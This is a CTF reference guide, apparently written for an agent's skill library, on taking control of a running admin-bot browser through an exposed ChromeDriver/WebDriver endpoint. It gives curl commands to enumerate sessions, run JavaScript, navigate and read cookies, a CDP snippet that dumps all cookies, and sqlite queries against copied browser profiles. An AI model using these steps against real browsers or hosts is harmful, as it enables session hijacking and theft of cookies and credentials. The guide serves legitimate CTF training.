# Hijacking a Running Bot via chromedriver's W3C API

Use this reference when an authorized CTF/admin-bot environment exposes a local ChromeDriver/WebDriver endpoint and direct browser control is more reliable than building a blind-XSS bootstrap.

The primitive is:

```text
reachable WebDriver endpoint
  -> enumerate active session
  -> inspect current origin/state
  -> navigate / execute JS / read origin-visible cookies
  -> use CDP only when W3C is insufficient
```

Do not assume ChromeDriver is reachable merely because a Selenium bot exists. First verify the process, bind address and listening port in the scoped environment.

## 1. Find and verify the WebDriver endpoint

Typical local checks:

```bash
ps -ef | grep -E 'chromedriver|chromium|chrome' | grep -v grep
ss -tlnp | grep -E 'chromedriver|chrome'
curl -s http://127.0.0.1:PORT/status
```

The default ChromeDriver port is often `9515`, but CTF harnesses may choose an arbitrary free port.

Success evidence is a valid WebDriver status response, not merely a running process.

## 2. Enumerate active sessions

Many ChromeDriver deployments expose active sessions through:

```bash
curl -s http://127.0.0.1:PORT/sessions
```

Record:

- session ID;
- browser version;
- current URL/origin;
- `goog:chromeOptions.debuggerAddress` when present.

Every later W3C call is scoped to a session:

```text
/session/<SESSION_ID>/...
```

## 3. Core W3C operations

Common operations:

| Verb + path | Purpose |
| --- | --- |
| `GET /status` | WebDriver health/version |
| `GET /sessions` | active sessions when supported |
| `GET /session/$SID/url` | current URL |
| `POST /session/$SID/url` | top-level navigation |
| `GET /session/$SID/cookie` | cookies visible to current origin |
| `POST /session/$SID/cookie` | set a cookie in the current browser context |
| `POST /session/$SID/execute/sync` | execute JavaScript |
| `POST /session/$SID/alert/accept` | dismiss blocking alert |
| `POST /session/$SID/alert/text` | inspect alert text |

Example synchronous JS:

```bash
curl -s -X POST http://127.0.0.1:PORT/session/$SID/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"return document.title","args":[]}'
```

Important behavior:

- include `"args":[]` even when no arguments are needed;
- use an explicit `return` when you need a value;
- blocking alerts can cause unrelated commands to fail until dismissed;
- legacy/non-W3C endpoints may be unavailable in strict W3C mode.

## 4. Origin and cookie discipline

`GET /cookie` is normally scoped to the browser's **current document origin**.

If the session is on an attacker origin, target-origin cookies will not automatically appear. Navigate to the target origin first, then query cookies again.

Record:

- scheme;
- hostname;
- port;
- cookie `Domain`;
- cookie `Path`;
- `Secure`;
- `HttpOnly`;
- `SameSite`.

Do not confuse:

```text
same host, different port
```

with a completely separate cookie domain. Cookie domain matching is host-based, while origin isolation also includes scheme and port. Browser behavior therefore needs to be reasoned about per operation.

## 5. Useful direct-control recipes

### Inspect current state

```bash
curl -s http://127.0.0.1:PORT/session/$SID/url

curl -s -X POST http://127.0.0.1:PORT/session/$SID/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"return {title:document.title,origin:location.origin,href:location.href}","args":[]}'
```

### Navigate to a target page

```bash
curl -s -X POST http://127.0.0.1:PORT/session/$SID/url \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:TARGET_PORT/target"}'
```

### Read DOM-derived state

```bash
curl -s -X POST http://127.0.0.1:PORT/session/$SID/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"return document.documentElement.outerHTML","args":[]}'
```

### Dismiss a blocking alert

```bash
curl -s -X POST http://127.0.0.1:PORT/session/$SID/alert/accept
```

## 6. When W3C is not enough: CDP bridge

Some tasks need browser capabilities not exposed cleanly by ordinary WebDriver, such as:

- reading all browser cookies independent of current origin;
- richer network inspection;
- low-level page/dialog control;
- asynchronous browser instrumentation.

When `goog:chromeOptions.debuggerAddress` is present in session capabilities, query the local DevTools endpoint:

```bash
curl -s http://DEBUG_HOST:DEBUG_PORT/json
```

A page target may expose a `webSocketDebuggerUrl`.

Generic Python shape:

```python
import json
import websocket

ws = websocket.create_connection(
    "ws://DEBUG_HOST:DEBUG_PORT/devtools/page/PAGE_ID",
    timeout=10,
)

ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
print(json.loads(ws.recv()))
```

CDP WebSocket origin restrictions are browser/version dependent. If a direct WebSocket connection is rejected, prefer an equivalent W3C operation first rather than assuming an old CDP bypass still works.

## 7. Profile artifacts: work on copies

If the live bot is gone but a browser profile remains, useful artifacts may include:

```text
Default/Cookies
Local State
History
Login Data
Web Data
Session Storage
Local Storage
```

Treat the profile as forensic evidence.

Safe sequence:

```bash
cp -a /path/to/browser-profile /tmp/profile-copy
sqlite3 /tmp/profile-copy/Default/Cookies '.schema'
sqlite3 /tmp/profile-copy/Default/Cookies \
  'SELECT host_key,name,path,length(encrypted_value) FROM cookies'
```

Do **not** start a new Chrome/ChromeDriver instance against the only copy of a target profile. A new process may create locks, migrate schemas, or rewrite browser databases.

Use:

```text
original profile -> preserve
copy -> experiments
```

rather than mutating the original.

Chrome cookie encryption is platform/version/keychain dependent. Do not hard-code one historical `v10`/PBKDF2 recipe as universal truth. First identify:

- browser version;
- operating system;
- whether a mock/basic keychain is in use;
- `Local State` encryption metadata;
- cookie value prefix/format.

If browser-artifact recovery becomes the primary task, pivot to `ctf-forensics`.

## 8. Keep unrelated local trust-boundary shortcuts separate

Sometimes an authorized local CTF environment also exposes:

- readable application source;
- writable SQLite databases;
- environment files;
- loopback-only APIs.

Those may create a shorter local exploitation path than browser hijacking, but they are **not** part of the WebDriver primitive.

Do not bury a challenge-specific database rewrite, password reset, or flag endpoint inside this reference. Instead:

```text
WebDriver control still required?
  yes -> continue here
  no  -> pivot to the actual local/web trust-boundary technique
```

This keeps the reference reusable and avoids teaching one instance's filesystem/database layout as if it were a ChromeDriver property.

## 9. Decision tree

```text
Is ChromeDriver/WebDriver reachable?
  no
    -> use ordinary bot-XSS / browser exploit path
  yes
    -> active session exists?
         no
           -> do not create one against the only target profile without preserving it
         yes
           -> inspect URL/origin/version
           -> W3C sufficient?
                yes
                  -> navigate / execute / cookies / alerts
                no
                  -> inspect debuggerAddress
                  -> try CDP with exact-version verification
```

Prefer direct WebDriver control when:

- the endpoint is explicitly reachable in the challenge scope;
- the bot already carries useful authenticated state;
- a blind-XSS bootstrap is unreliable or unnecessary;
- you can validate each browser action directly.

Prefer the ordinary admin-bot/XSS references when:

- WebDriver is not reachable;
- only a report/visit interface is exposed;
- the intended primitive is a browser parsing/CSP/cookie exploit rather than direct browser control.

## 10. Validation checklist

- [ ] WebDriver endpoint actually reachable.
- [ ] Browser/session version recorded.
- [ ] Active session ID recorded.
- [ ] Current origin verified before cookie conclusions.
- [ ] W3C response proves each action occurred.
- [ ] Alerts handled explicitly.
- [ ] CDP used only when needed and tested on exact version.
- [ ] Browser profile preserved before offline experimentation.
- [ ] Challenge-specific local DB/filesystem shortcuts kept outside this reference.
- [ ] Final browser-derived evidence can be traced to one request/action.

## Provenance

Generalized from authorized CTF/admin-bot experiments performed in 2026 that exposed a local ChromeDriver endpoint. The permanent reference intentionally excludes challenge names, local usernames, instance-specific ports/paths, credentials, flag formats, and session chronology.
